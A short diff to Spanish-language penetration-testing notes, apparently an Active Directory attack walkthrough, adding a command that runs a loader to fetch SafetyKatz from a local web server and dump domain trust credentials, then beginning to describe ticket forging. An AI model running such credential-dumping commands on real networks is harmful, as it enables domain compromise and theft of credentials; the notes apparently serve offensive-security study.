@@ -1359,7 +1359,8 @@ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsa
 ```
 
 Y ahora podremos ejecutaremos el *SafetyKatz* para extraer las credenciales
-```sehll
-
-
+```shell
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
 ```
+
+Obteniendo las credenciales del dominio, podemos crear un ticket con el SID 
